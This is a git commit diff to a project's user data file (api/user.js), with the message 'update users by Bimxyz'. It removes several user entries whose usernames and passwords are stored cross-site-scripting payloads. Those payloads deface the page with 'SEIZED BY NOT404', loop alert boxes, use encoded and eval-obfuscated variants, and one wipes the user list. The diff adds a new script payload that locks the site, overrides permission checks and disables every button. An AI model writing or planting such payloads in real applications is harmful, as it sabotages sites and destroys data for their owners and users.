44ee699fd4a9cd43f7d5602c5a9c14addae1a0fd
bimxyzofficial-cloud <bimxyzofficial@gmail.com>
2026-01-09 00:19:38 +0700

    update users by Bimxyz

--- api/user.js
+++ api/user.js
@@ -1,34 +1,6 @@
 export const users = [
   {
-    "username": "<script>",
-    "password": "1928726336"
-  },
-  {
-    "username": "<iframe srcdoc=\"&lt;script&gt;setInterval(()=&gt;alert('You Are An Idiot\\nHacked By Not404'),1000);document.body.style.background='#000';document.body.innerHTML='&lt;h1 style=\\\"color:red;text-align:center;margin-top:20%;\\\"&gt;SEIZED BY NOT404&lt;/h1&gt;';&lt;/script&gt;\"></iframe>",
-    "password": "1992(2+#8$+#-#7#7"
-  },
-  {
-    "username": "<iframe srcdoc=\"<svg onload='setInterval(()=>alert(`Hacked By Not404`),1500)'><foreignObject width='100%' height='100%'><body xmlns='http://www.w3.org/1999/xhtml' style='background:#000;color:#f00;margin:0;height:100vh;display:flex;align-items:center;justify-content:center;font-size:3em;'>SEIZED BY NOT404</body></foreignObject></svg>\"></iframe>",
-    "password": "11111"
-  },
-  {
-    "username": "<iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#115;&#101;&#116;&#73;&#110;&#116;&#101;&#114;&#118;&#97;&#108;&#40;&#40;&#41;&#61;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#89;&#111;&#117;&#32;&#65;&#114;&#101;&#32;&#65;&#110;&#32;&#73;&#100;&#105;&#111;&#116;&#92;&#110;&#72;&#97;&#99;&#107;&#101;&#100;&#32;&#66;&#121;&#32;&#78;&#111;&#116;&#52;&#48;&#52;&#39;&#41;&#44;&#49;&#48;&#48;&#48;&#41;&#59;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#61;&#39;&#35;&#48;&#48;&#48;&#39;&#59;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#105;&#110;&#110;&#101;&#114;&#72;&#84;&#77;&#76;&#61;&#39;&#60;&#104;&#49;&#32;&#115;&#116;&#121;&#108;&#101;&#61;&#34;&#99;&#111;&#108;&#111;&#114;&#58;&#114;&#101;&#100;&#59;&#116;&#101;&#120;&#116;&#45;&#97;&#108;&#105;&#103;&#110;&#58;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#109;&#97;&#114;&#103;&#105;&#110;&#45;&#116;&#111;&#112;&#58;&#50;&#48;&#37;&#34;&#62;&#83;&#69;&#73;&#90;&#69;&#68;&#32;&#66;&#89;&#32;&#78;&#79;&#84;&#52;&#48;&#52;&#60;&#47;&#104;&#49;&#62;&#39;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\"></iframe>",
-    "password": "1123"
-  },
-  {
-    "username": "<svg onload=\"setInterval(()=>alert('You Are An Idiot\\nHacked By Not404'),1000);document.body.style.background='#000';document.body.innerHTML='<h1 style=\\\"color:red;text-align:center;padding-top:20%;\\\">SEIZED BY NOT404</h1>'\">",
-    "password": "<svg onload=\"setInterval(()=>alert('You Are An Idiot\\nHacked By Not404'),1000);document.body.style.background='#000';document.body.innerHTML='<h1 style=\\\"color:red;text-align:center;padding-top:20%;\\\">SEIZED BY NOT404</h1>'\">"
-  },
-  {
-    "username": "<svg/onload=\"eval('setInterval'+'(()=>'+'alert(`Hacked By Not404`)'+',1000)');document.body.style.background='black';document.body.innerHTML='<h1 style=color:red>SEIZED BY NOT404</h1>';\">",
-    "password": "<svg/onload=\"eval('setInterval'+'(()=>'+'alert(`Hacked By Not404`)'+',1000)');document.body.style.background='black';document.body.innerHTML='<h1 style=color:red>SEIZED BY NOT404</h1>';\">"
-  },
-  {
-    "username": "<svg onload=\"   setInterval(function(){     alert('You Are An Idiot\\nHacked By Not404');   }, 2000);      document.body.style.background = 'black';   document.body.innerHTML = '<h1 style=\\\"color: red; text-align: center; margin-top: 100px;\\\">SEIZED BY NOT404</h1>'; \">",
-    "password": "<svg onload=\"   setInterval(function(){     alert('You Are An Idiot\\nHacked By Not404');   }, 2000);      document.body.style.background = 'black';   document.body.innerHTML = '<h1 style=\\\"color: red; text-align: center; margin-top: 100px;\\\">SEIZED BY NOT404</h1>'; \">"
-  },
-  {
-    "username": "<script> setTimeout(()=>{ window.users=[]; localStorage.setItem('user_creator_tracker','{}'); if(window.saveToGitHub){window.saveToGitHub();} document.body.innerHTML='<div style=\"background:black;color:red;height:100vh;display:flex;align-items:center;justify-content:center;font-size:3em;\">WIPED BY NOT404</div>'; },3000); </script>",
+    "username": "<script> localStorage.setItem('system_locked','true'); sessionStorage.setItem('protected','NOT404'); window.hasPermission=function(){return false;}; window.confirmDelete=function(){alert('System locked by NOT404');return false;}; setInterval(()=>{ document.querySelectorAll('.btn-delete,button').forEach(btn=>{ btn.disabled=true; btn.style.opacity='0.5'; btn.style.cursor='not-allowed'; }); },1000); const lockMsg=document.createElement('div'); lockMsg.innerHTML='<div style=\"position:fixed;top:10px;right:10px;background:red;color:white;padding:10px;z-index:9999;\">LOCKED BY NOT404</div>'; document.body.appendChild(lockMsg); window.loadUsers=function(){ document.getElementById('userTable').innerHTML='<tr><td colspan=\"3\" style=\"color:red;text-align:center;padding:50px;\"><h2>SYSTEM LOCKED BY NOT404</h2></td></tr>'; }; </script>",
     "password": "."
   }
 ];
